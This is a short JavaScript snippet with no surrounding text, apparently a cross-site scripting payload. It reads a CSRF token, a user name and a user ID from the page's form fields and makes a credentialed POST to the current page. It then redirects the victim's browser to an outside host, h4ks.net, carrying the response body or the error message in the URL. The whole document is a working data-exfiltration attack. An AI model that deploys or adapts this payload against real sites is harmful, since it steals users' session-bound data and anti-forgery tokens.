var csrf = document.getElementsByName('_csrf_token')[0].value;
var name = encodeURIComponent(document.getElementsByName('__name')[0].value);
var userId = document.getElementsByName('__id')[0].value;
fetch("", {
    "credentials": "include",
    "headers": {
        "content-type": "application/x-www-form-urlencoded",
    },
    "method": "POST",
    "body": "name=" + name + "&user_id=" + userId + "&_csrf_token=" + csrf,
}).then(r => r.text())
.then(body => {
    location = '//h4ks.net/go/?'+encodeURIComponent(body);
})
.catch(err => {
    location = '//h4ks.net/go/?'+encodeURIComponent(err.toString());
})
